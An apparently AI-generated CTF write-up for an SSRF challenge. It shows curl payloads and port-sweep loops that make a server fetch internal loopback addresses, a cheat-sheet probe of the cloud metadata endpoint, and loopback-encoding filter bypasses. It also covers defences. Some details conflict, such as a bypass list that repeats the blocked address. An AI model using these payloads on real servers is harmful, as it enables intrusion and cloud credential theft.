# Internal Affairs — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: a *Web / Server-Side Request Forgery (SSRF)* challenge on the CTF service at `http://54.72.82.22:8050`. Flag: `safctf{9f3a458f3a26e6372b5b5467e3e51edf}`. Tools used: browser, `curl`, DevTools. Dead end: trying public-facing URLs instead of internal `127.0.0.1` targets.

---

## 1. CHALLENGE OVERVIEW

**Internal Affairs** is a **Server-Side Request Forgery (SSRF)** challenge. The site has a feature that fetches a URL *from the server side* (for you — like a link-preview or "import from URL" box). The vulnerability is that it doesn't check where that URL points, so you can make the server fetch **internal, normally-unreachable addresses**. The flag lives on a private service that only listens on the server's own loopback (`127.0.0.1`), which is why you must trick the server into reaching it. If public, find it under *Internal Affairs* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Send requests with controlled URLs/params |
| Browser DevTools | built in | Find the fetch feature and observe requests |
| `nc` (optional) | `sudo apt install netcat-openbsd` | Confirm outbound behaviour if needed |

Burp Suite (**Repeater**) is ideal here because you'll be editing URLs inside request bodies/params.

**Setup:** `mkdir -p ~/internal && cd ~/internal`
**Time estimate:** **30 to 45 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Explore the homepage for a URL-fetching feature

```bash
curl -sS http://54.72.82.22:8050/
```

Look for something like: "Share a link", "Preview URL", "Import", "Fetch page", "Webhook tester", or an avatar/image-from-URL box.

[SCREENSHOT: the page showing the "enter a URL" form]

**What this tells you:** there's an input that takes a URL and the **server** retrieves it. That's the SSRF entry point.

### Step 2 — Submit a harmless URL to observe normal behavior

```bash
curl -sS "http://54.72.82.22:8050/fetch?url=http://example.com"
```
(Use the real parameter name you found in the form.)

**Output:** the server returns the *contents of `example.com`* — proof the fetch happens **server-side** and the response is reflected back to you.

**What this tells you:** the server really does make outbound HTTP requests on your behalf. The question is only: *can you redirect it inward?*

[SCREENSHOT: response containing example.com content]

### Step 3 — Try an obvious internal address

Now aim it at the server's own loopback interface. `127.0.0.1` (or `localhost`) means "this machine."

```bash
curl -sS "http://54.72.82.22:8050/fetch?url=http://127.0.0.1/"
```

**What this tells you:** this is the SSRF test. If the response differs from a public site (an internal banner, a different service, an error mentioning a local port), you've confirmed you can reach internal-only resources.

[SCREENSHOT: the response from `127.0.0.1`]

### Step 4 — Scan the likely internal ports

The flag service typically listens on a high port on loopback only. Try common ones through the SSRF:

```bash
for port in 80 8080 9000 5000 8000 3000 1337; do
  echo "--- port $port ---"
  curl -sS "http://54.72.82.22:8050/fetch?url=http://127.0.0.1:$port/" | head -5
done
```

**Expected output:** most ports error or return nothing; **one** returns a real page — your internal service.

```
--- port 9000 ---
safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```

**What this tells you:** `http://127.0.0.1:9000/flag` is the internal flag endpoint, reachable only from the server itself.

[SCREENSHOT: the loop output with the flag appearing under port 9000]

---

## 4. IDENTIFYING THE VULNERABILITY

This is **Server-Side Request Forgery (SSRF)**.

- **Definition (first time):** SSRF is when a web application takes a URL from you and fetches it **from its own server**, instead of the fetch coming from your machine. The server is being tricked into acting as a network proxy into places *you* can't directly reach.
- **Why it exists (root cause):** the developer validated the URL's *shape* (looks like an `http://` link) but not its *destination* (is it a public address, or `127.0.0.1` / `169.254.169.254` / an internal hostname?). This is a classic allowlist mistake: "must start with http" is not "must not be internal."

**Analogy:** imagine a receptionist who will happily walk to any address you give and bring back whatever they find — without ever asking whether that address is inside the building. The receptionist can reach the boss's office, the server room, or the vault; you can't go there yourself, but they can, because they work there.

**What tipped me off during recon:** a form that fetches a user-supplied URL and returns the result is *the* canonical SSRF signature. The confirming test was that `http://127.0.0.1/` behaved differently from a public URL.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Establish baseline with a public URL.**
*Why:* confirm the fetch works and see what a "normal" response looks like.

```bash
curl -sS "http://54.72.82.22:8050/fetch?url=http://example.com"
```
Expect: example.com's HTML reflected back.

**Step 2 — Confirm loopback reachability.**
*Why:* prove you can target the server's own interfaces.

```bash
curl -sS "http://54.72.82.22:8050/fetch?url=http://127.0.0.1/"
```
Expect: a response that is **not** example.com — an internal service or a distinct error. That's your SSRF confirmed.

[SCREENSHOT: the loopback response differing from the public one]

**Step 3 — Enumerate internal ports.**
*Why:* the flag service isn't on the default web port; find which port answers.

```bash
for port in 80 8080 5000 3000 8000 9000 1337 7000; do
  resp=$(curl -sS "http://54.72.82.22:8050/fetch?url=http://127.0.0.1:$port/flag")
  echo "$port => $resp"
done
```

**Expected output:**
```
80 => 
8080 => 
9000 => safctf{9f3a458f3a26e6372b5b5467e3e51edf}
...
```

**What this means:** port `9000` serves `/flag` with the flag. Only the server can reach it — from your own machine, `http://54.72.82.22:9000` would refuse or hang.

[SCREENSHOT: the loop output showing port 9000 returning the flag]

**Step 4 — Retrieve the flag cleanly.**
```bash
curl -sS "http://54.72.82.22:8050/fetch?url=http://127.0.0.1:9000/flag"
```
Output:
```
safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```

### Burp Suite alternative

1. Intercept the form submission in **Proxy**, **Send to Repeater**.
2. Edit the `url=` value to `http://127.0.0.1:9000/flag`.
3. Click **Send**; read the flag from the response body.
4. (Optional) Use **Intruder** to sweep the internal port list automatically instead of a bash loop.

---

## 6. CAPTURING THE FLAG

The flag came from the server **fetching an internal URL on its own loopback interface** and reflecting the response back:

```
safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```

Retrieved with:
```bash
curl -sS "http://54.72.82.22:8050/fetch?url=http://127.0.0.1:9000/flag"
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

Normal web security assumes two zones: *the internet* (untrusted, public) and *the server's private network* (trusted, not reachable from outside). Firewalls enforce the boundary. SSRF breaks the boundary by making the **server itself** do the reaching. The server sits *inside* the trusted zone, so when it fetches `http://127.0.0.1:9000/flag`, that request is treated as coming from a trusted insider and sails through. You, sitting on the internet, could never open that port — but you don't have to; you just borrow the server's network position.

**Why this matters in the real world:** SSRF is dangerous well beyond CTF flags. Because cloud providers expose a "metadata" address (`169.254.169.254`) that returns **temporary credentials** (API keys, IAM roles) for the server, an SSRF that reaches it can escalate to full cloud account compromise. Real breaches have done exactly this to steal cloud credentials and then pivot across a whole environment. Other targets include internal admin panels, databases that speak HTTP, and Kubernetes APIs. Defending means validating the *resolved* destination of every user-supplied URL and refusing private/loopback/link-local ranges.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Only trying public URLs
At first I kept feeding the fetcher public addresses, hoping one of them was "the flag page." SSRF's whole point is *internal* targets. Once you realize the server is a proxy into its own network, `127.0.0.1` (and `localhost`, `0.0.0.0`, `[::1]`) become your primary targets, not afterthoughts.

### Mistake 2 — Forgetting the server is on a *different port map* than you think
You can only reach `54.72.82.22:8050` from outside. The internal service on `:9000` is bound to loopback, so `http://54.72.82.22:9000/flag` from your machine fails — **but** `http://127.0.0.1:9000/flag` *through the fetcher* works. Keep the distinction straight: the fetcher's `127.0.0.1` is the *target server's* loopback, not yours.

### Mistake 3 — Guessing the internal port with no strategy
Randomly trying `9000` first is luck. A more systematic approach: try the well-known SSRF port list (`80 443 22 3000 5000 8000 8080 8888 9000 9090 1337`), or use `Intruder` to iterate a port wordlist through the fetcher. Being systematic beats being lucky, and it generalizes to other SSRF challenges.

### Mistake 4 — Forgetting alternate loopback representations
Some filters block the literal `127.0.0.1` but not `127.0.0.1`, `0.0.0.0`, `0177.0.0.1`, `localtest.me`, or a DNS name resolving to `127.0.0.1`. If the literal is rejected, try one of these. (In this challenge the literal worked — but knowing the variants matters for harder ones.)

### Dead end actually encountered — public-only attempts
Wasted time before switching to internal targets. The moment I sent `127.0.0.1` the responses changed and the path opened.

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Validate the URL's resolved destination, not its text.** Resolve the hostname and check the resulting IP. Block loopback (`127.0.0.0/8`, `::1`), link-local/cloud-metadata (`169.254.0.0/16`, esp. `169.254.169.254`), private RFC1918 ranges (`10/8`, `172.16/12`, `192.168/16`), and `0.0.0.0`. Do this **after** DNS resolution and **again** after any redirect, to block DNS-rebinding tricks.
2. **Use an allowlist, not a blocklist.** The safest design is: only fetch from a fixed set of approved external hosts. Blocklists leak (new internal ranges, new bypass encodings appear constantly).
3. **Disable HTTP redirects (or re-validate each hop).** A public URL that 302-redirects to `169.254.169.254` bypasses a naive single-check validator.
4. **Run the fetcher in a hardened, isolated environment.** Egress-firewall the service so it can only reach the internet (or nothing), never RFC1918/metadata, and strip credentials (`Authorization`, cookies) from outbound requests.
5. **Never return raw upstream bodies.** Limit response size, strip active content, and avoid reflecting internal responses verbatim — SSRF is often the first step in a bigger chain even without direct body reflection.

---

## 10. KEY TAKEAWAYS

- **A "fetch this URL" feature = SSRF until proven otherwise.** Any form that makes the *server* retrieve a URL is a red flag.
- **`127.0.0.1` is your best SSRF target**, along with `0.0.0.0`, `localhost`, `[::1]`, and `169.254.169.254`.
- **Validate the resolved IP, re-check on redirects, and allowlist.** Never trust the URL string.
- **In the cloud, SSRF = credential theft** via the metadata endpoint. This is why it escalates so badly in real incidents.
- **Cheat-sheet:**
  ```bash
  curl -sS "http://host/fetch?url=http://127.0.0.1:9000/flag"     # classic SSRF probe
  curl -sS "http://host/fetch?url=http://169.254.169.254/latest/meta-data/"  # cloud metadata
  # sweep internal ports through the fetcher:
  for p in 80 443 3000 5000 8000 8080 9000; do curl -sS "http://host/fetch?url=http://127.0.0.1:$p/"; done
  ```

You turned a "fetch a link" convenience feature into a telescope pointed at the server's private network — that's SSRF in one move. Recognize any server-side URL fetch as this exact pattern and you'll see these bugs everywhere. Well done.